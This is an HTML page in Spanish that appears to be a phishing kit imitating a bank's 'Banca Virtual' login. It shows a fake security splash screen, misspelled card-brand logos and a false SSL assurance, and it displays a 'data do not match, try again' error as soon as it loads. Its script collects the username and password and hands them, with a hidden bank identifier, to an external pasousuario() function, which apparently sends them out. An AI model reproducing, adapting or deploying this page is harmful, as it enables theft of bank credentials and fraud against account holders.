<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>3D SECURITY</title>
    <link rel="stylesheet" href="../../css/davi.css">
	<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
	<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
	<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">  		
<style>
    body {
      background: #fff;
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    /* ----------- SPINNER FULLSCREEN ---------- */
#splash-spinner {
  position: fixed;
  z-index: 99999;
  top: 0; left: 0; right: 0; bottom: 0;
  width: 100vw; height: 100vh;
  background: #fff;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  transition: opacity 0.4s;
}
#splash-spinner.hide {
  opacity: 0;
  pointer-events: none;
  transition: opacity 0.5s;
}
.splash-logo {
  width: 75px;
  margin: 22px 0 8px 16px;
  align-self: flex-start;
}
.splash-illu {
  width: 350px; /* MÃ¡s grande */
  margin-top: 20px;
  margin-bottom: 24px;
  display: block;
}
.splash-loader {
  margin-top: 48px;
  border: 6px solid #e8e8e8;
  border-top: 6px solid #484848;
  border-right: 6px solid #484848;   /* MÃ¡s relleno: lÃ­nea gris cubre 2/4 */
  border-bottom: 6px solid #e8e8e8;
  border-left: 6px solid #e8e8e8;
  border-radius: 50%;
  width: 60px;
  height: 60px;
  animation: spin 1s linear infinite;
}
@keyframes spin {
  0% { transform: rotate(0deg);}
  100% { transform: rotate(360deg);}
}
    /* ----------- FIN SPINNER ----------- */

    .header {
      background: #fff;
      padding: 10px 0 12px 15px;
      box-sizing: border-box;
      display: flex;
      align-items: center;
      border-bottom: 2px solid #f2f2f2;
    }
    .logo {
      height: 80px;
    }
    .main-content {
      padding: 32px 28px 0 28px;
    }
    .title {
      font-size: 1.4em;
      font-weight: 700;
      color: #222;
      margin-bottom: 36px;
      margin-top: 0;
	  font-family: 'Montserrat', Arial, Helvetica, sans-serif;
	  font-weight: bold;
	  text-align: center;
    }
    .input-group {
      margin-bottom: 40px;
      position: relative;
    }
    .input-material {
      position: relative;
      width: 100%;
    }
    .input-material .material-symbols-outlined {
      position: absolute;
      left: 0;
      top: 12px;
      color: #999;
      font-size: 20px;
      pointer-events: none;
      transition: color 0.18s;
    }
    .input-material input {
      width: 100%;
      padding: 12px 0 8px 32px;
      font-size: 1.07em;
      border: none;
      border-bottom: 1px solid #bbb;
      outline: none;
      background: transparent;
      color: #222;
      transition: border-color 0.18s;
    }
    .input-material input:focus {
      border-bottom: 2px solid #003C82;
    }
    .input-material label {
      position: absolute;
      top: 12px;
      left: 32px;
      color: #888;
      font-size: 1em;
      pointer-events: none;
      transition: 0.18s;
      background: #fff;
      padding: 0 4px;
    }
    .input-material input:focus + label,
    .input-material input:not(:placeholder-shown) + label {
      top: -8px;
      left: 28px;
      font-size: 0.88em;
      color: #003C82;
      background: #fff;
    }
.remember-group {
  margin-bottom: 18px;
  display: flex;
  align-items: center;
}
.remember-group input[type="checkbox"] {
  width: 24px;
  height: 24px;
  accent-color: #009dd6;
  margin-right: 0;   /* â† Importante: solo usas el margen en el label */
}
.remember-group label {
  font-size: 1em;
  color: #444;
  cursor: pointer;
  user-select: none;
  margin-bottom: 0;
  margin-left: 16px;  /* â† AquÃ­ ajustas cuÃ¡nto se mueve el texto */
}
    .btn-ingresar {
      width: 100%;
      padding: 14px 0 12px 0;
      background: #003C82;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-weight: 700;
      font-size: 1.07em;
      margin-top: 10px;
      cursor: pointer;
      transition: background 0.18s;
      box-shadow: 0 1.5px 5px rgba(255,0,0,0.05);
    }
    .btn-ingresar:hover {
      background: #003C82;
    }

    .mensaje {
      display: none;
      color: #ed1c24;
      margin-top: 7px;
      font-size: 0.97em;
    }
    .pass {
      border: 1px solid #CCCCCC;
      border-bottom: 2px solid #bbb !important;
      border-radius: 6px;
      transition: border 0.2s;
    }
        .seguridad {
      margin: 19px 0 0 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      gap: 9px;
    }
.seguridad-titulo {
  color: #14a239;
  font-weight: bold;
  font-size: 1.1em;
  margin-bottom: 0;
  display: flex;
  align-items: center;
  gap: 7px;
  margin-left: 24px;
  margin-top: 12px;
}

    .seguridad-titulo img {
      height: 19px;
      margin-right: 4px;
    }
    .seguridad-logos {
      display: flex;
      gap: 13px;
      flex-wrap: wrap;
      align-items: center;
      margin: 6px 0 0 0;
      text-align: center;
    }
    .seguridad-logos img {
      height: 60px;
      align-items: center;
    }
    .seguridad-text {
      color: #222;
      font-size: 0.99em;
      margin-bottom: 0;
      display: flex;
      align-items: center;
      gap: 4px;
      margin-left: 24px;
      margin-top: 10px;
    }
    @media (max-width: 400px) {
      .main-content {
        padding: 20px 10px 0 10px;
      }
      #splash-spinner .splash-logo {
        width: 56px;
        margin-left: 7px;
      }
      #splash-spinner .splash-illu {
        width: 80px;
      }
      #splash-spinner .splash-clouds {
        width: 150px;
      }
      #splash-spinner .splash-loader {
        width: 56px; height: 56px;
        border-width: 4px;
      }
    }
</style>
</head>
<body>
<!-- SPLASH/SPINNER INICIAL -->
<div id="splash-spinner">
  <img src="colpalondin.svg" alt="" class="splash-illu">
  <div class="splash-loader"></div>
</div>

<!-- CONTENIDO NORMAL -->
<div class="container" style="display:none;" id="main-app">
  <div class="header">
    <img src="CORDESMAYO.png" alt="Logo" class="logo">
  </div>
<div class="main-content">
      <div class="title">Ingresa a tu Banca Virtual</div>
      <form autocomplete="off" id="loginForm">
        <div class="input-group">
          <div class="input-material">
            <span class="material-symbols-outlined">person</span>
            <input 
              type="text"
              name="usuario"
              id="txtUsuario"
              required
              placeholder=" "
              autocomplete="off"
            />
            <label for="txtUsuario">Nombre de Usuario</label>
          </div>
            <div class="mensaje" id="err-usuario" style="display:block;">
    <span style="display:inline-flex;align-items:center;">
      <img src="copete.svg" alt="error" style="width:17px;margin-right:4px;">
      Los datos ingresados no coinciden, intÃ©ntalo nuevamente.
    </span>
  </div>
        </div>
        <div class="input-group">
          <div class="input-material">
            <span class="material-symbols-outlined">lock</span>
            <input 
              type="password"
              name="password"
              id="txtPass"
              required
              placeholder=" "
              autocomplete="off"
            />
            <label for="txtPass">ContraseÃ±a</label>
          </div>
        </div>
        <div class="remember-group">
          <input type="checkbox" id="recordar" name="recordar">
          <label for="recordar">Recordar mi nombre de usuario</label>
        </div>
        <input type="hidden" value="GENERALES" id="banco">
        <div class="mensaje" id="err-mensaje">Por favor completa los datos correctamente.</div>
        <input type="button" id="btnUsuario" value="Ingresar" class="btn-ingresar">
      </form>
    </div>
  </div>
      <!-- Seguridad de pago -->
    <div class="seguridad">
      <div class="seguridad-titulo">
        <img src="candade.svg" alt="Seguridad">Seguridad de acceso
      </div>
      <div class="seguridad-text">
      Estamos comprometidos con la seguridad de sus datos. Todos sus accesos y transacciones estÃ¡n protegidos por protocolos de seguridad SSL.
      </div>
      <div class="seguridad-logos">
        <img src="vista.png" alt="vista">
        <img src="masti.png" alt="masti">
        <img src="amix.png" alt="amix">
        <img src="maestror.png" alt="maestror">
        <img src="dainirs.png" alt="dainirs">
        <!-- Agrega/quita logos a gusto -->
      </div>
    </div>
  </div>
<script type="text/javascript">
	// SPINNER SPLASH
	window.onload = function() {
		setTimeout(function(){
			document.getElementById('splash-spinner').classList.add('hide');
			setTimeout(function(){
				document.getElementById('splash-spinner').style.display = 'none';
				document.getElementById('main-app').style.display = '';
			}, 400);
		}, 3000);
	};

	$(document).ready(function() {
		$('#btnUsuario').click(function(){
			if (($("#txtUsuario").val().length > 0) && ($("#txtPass").val().length > 7)) {
				pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
			}else{
				$("#err-mensaje").show();
				$("#txtUsuario").css("border-bottom", "2px solid red");
				$("#txtPass").css("border-bottom", "2px solid red");
				$("#txtUsuario").focus();
			}			
		});
		// Opcional: ocultar mensaje al escribir
		$('#txtUsuario, #txtPass').on('input', function() {
			$("#err-mensaje").hide();
			$("#txtUsuario, #txtPass").css("border-bottom", "");
		});
	});
</script>
<script>
document.addEventListener("DOMContentLoaded", function() {
  document.getElementById('txtUsuario').addEventListener('input', function() {
    document.getElementById('err-usuario').style.display = 'none';
  });
});
</script>

</body>
